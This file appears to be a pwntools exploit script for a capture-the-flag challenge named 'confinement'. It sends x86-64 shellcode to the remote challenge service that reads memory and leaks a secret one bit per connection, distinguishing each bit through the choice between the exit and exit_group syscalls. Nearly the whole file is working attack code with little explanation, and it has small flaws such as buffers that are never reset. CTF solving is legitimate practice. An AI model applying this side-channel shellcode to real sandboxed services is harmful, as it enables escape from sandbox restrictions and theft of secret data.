from pwn import *

# context.log_level = 'debug'
exe = './confinement_patched'
elf = ELF('./confinement_patched')
context.binary = elf

#libc = ELF('libc')
#ld = ELF('ld')

def start(argv=[], *a, **kw):
    if(sys.argv[1] == "d"):
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif(sys.argv[1] == "r"):
        return remote("tamuctf.com", 443, ssl=True, sni="confinement")
    elif(sys.argv[1] == "l"):
        return process([exe] + argv, *a, **kw)

def s(a) : return io.send(a)
def sl(a) : return io.sendline(a)
def sa(a,b) : return io.sendafter(a,b)
def sla(a,b) : return io.sendlineafter(a,b)
def r(a) : return io.recv(a)
def ru(a) : return io.recvuntil(a)
def ra(a) : return io.recvall(a)
def rl() : return io.recvline()
def interactive() : return io.interactive()
def cls() : return io.close()
def p(a) : return log.info(a)
def suck(a) : return log.success(a)

gdbscript = '''
b main
c
'''.format(**locals())

#==========================================================
'''
 _   _                 _    _        _____                   
| | | |               | |  | |      |  __ \                  
| |_| | ___ _ __ ___  | |  | | ___  | |  \/ ___              
|  _  |/ _ \ '__/ _ \ | |/\| |/ _ \ | | __ / _ \             
| | | |  __/ | |  __/ \  /\  /  __/ | |_\ \ (_) |  _   _   _ 
\_| |_/\___|_|  \___|  \/  \/ \___|  \____/\___/  (_) (_) (_)
                                                             
'''                                                                                                                                                                                             
#==========================================================

binary_val = ""
temp = ""
byte_val = 0
for i in range(0, 64):
    # shift_val = 0
    for j in range(0, 8):
        io = start()
        shellcode = asm(f'''
                    
                    lea rbx, [r8-0x1290]
                    mov rcx, [rbx + {i}]
                    shr rcx, {j}
                    and rcx, 0x1
                    cmp rcx, 0x0
                    je label
                    mov rax, 0x3c
                    mov rdi, 0
                    syscall

                    label:
                    mov rax, 231
                    mov rdi, 0
                    syscall

                    ''')
        # shift_val += 1
        sl(shellcode)
        val = rl().decode()[:-1]
        print(val)
        if(val == "adios"):
            temp += "0"
        else:
            temp += "1" 
        if(j == 7):           
            binary_val = temp[::-1]
    print(binary_val)    
print(binary_val)           
cls()
interactive()

'''
al --> 8 bits
al >> 7


'''